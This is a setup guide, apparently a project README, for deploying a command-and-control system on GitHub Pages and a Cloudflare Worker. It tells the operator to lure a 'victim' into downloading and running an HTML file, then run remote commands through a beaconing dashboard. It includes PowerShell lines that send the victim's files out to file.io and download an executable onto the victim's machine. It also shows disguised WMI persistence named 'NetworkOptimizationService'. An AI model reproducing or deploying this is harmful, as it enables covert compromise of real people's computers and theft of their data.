# Setup Instructions

## 1. Push to GitHub

```bash
# Create repository on GitHub.com first, then:
git remote add origin https://github.com/shrnx/readme.git
git branch -M main
git push -u origin main
```

## 2. Enable GitHub Pages

1. Go to: https://github.com/shrnx/readme/settings/pages
2. Source: Deploy from a branch
3. Branch: main / (root)
4. Click Save
5. Wait 2-3 minutes for deployment

## 3. Deploy Cloudflare Worker

1. Sign up: https://dash.cloudflare.com/sign-up (free)
2. Go to: Workers & Pages → Create Worker
3. Name: readme
4. Click Deploy
5. Click Edit Code
6. Delete existing code
7. Copy content from worker.js
8. Click Save and Deploy

## 4. Create KV Namespace

1. Workers & Pages → KV
2. Click Create namespace
3. Name: C2_STORAGE
4. Click Add
5. Go back to your worker
6. Settings → Variables
7. KV Namespace Bindings → Edit variables
8. Add binding:
   - Variable name: C2_STORAGE
   - KV namespace: C2_STORAGE
9. Click Save

## 5. Test Setup

Visit: https://shrnx.github.io/readme

You should see the landing page!

## 6. Access Control Panel

Visit: https://readme.workers.dev/admin

You'll see your C2 dashboard!

## 7. Deploy to Victim

Send victim to: https://shrnx.github.io/readme

They download and run the HTML file.

Within 60 seconds, they appear in your control panel!

## 8. Execute Commands

Examples:
- `whoami`
- `hostname`
- `systeminfo`
- `Get-Process`
- `ipconfig`

Results appear in ~60 seconds (beacon interval).

## 9. Advanced Usage

### Download file from victim:
```powershell
$content = Get-Content 'C:\path\to\file.txt' -Raw
Invoke-WebRequest -Uri 'https://file.io' -Method POST -Body $content
```

### Upload file to victim:
```powershell
Invoke-WebRequest -Uri 'http://your-server/file.exe' -OutFile 'C:\temp\file.exe'
```

### Take screenshot:
(Use the screenshot PowerShell script)

---

## URLs to Remember

- **Landing Page:** https://shrnx.github.io/readme
- **Control Panel:** https://readme.workers.dev/admin
- **GitHub Repo:** https://github.com/shrnx/readme

---

## Cleanup (When Done)

### On victim:
```powershell
gwmi -Namespace root\subscription -Class __EventFilter -Filter "Name='NetworkOptimizationService'" | Remove-WmiObject
gwmi -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='NetworkOptimizationService'" | Remove-WmiObject
Remove-Item 'C:\ProgramData\Microsoft\Network\netbeacon.ps1' -Force
```

### Delete everything:
1. Delete GitHub repository
2. Delete Cloudflare Worker
3. Delete KV namespace
